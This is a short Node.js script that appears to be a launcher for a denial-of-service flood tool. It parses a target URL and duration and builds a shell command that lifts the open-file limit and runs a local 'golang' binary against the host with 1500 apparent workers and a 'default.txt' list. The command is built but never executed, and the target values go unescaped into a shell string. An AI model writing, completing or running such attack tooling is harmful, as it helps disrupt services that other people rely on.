const { execSync } = require('child_process');
const { parse } = require("url");

if(process.argv.length != 4)
{
    console.log(`Wrong Usage!`);
    console.log(`Usage: node golang.js [URL] [TIME]`);
    process.exit(3162);
}

var target = process.argv[2];
var time = process.argv[3];
const destination = parse(target);
const protocol = destination.protocol == 'https:' ? 'ssl' : 'plain';
let port = destination.port;
if(port == null) {
    port = protocol == 'ssl' ? 443 : 80;
}
const payload = `ulimit -n 999999; ./golang ${destination.hostname} ${port} 1500 ${time} default.txt ${destination.pathname} ${protocol}`;
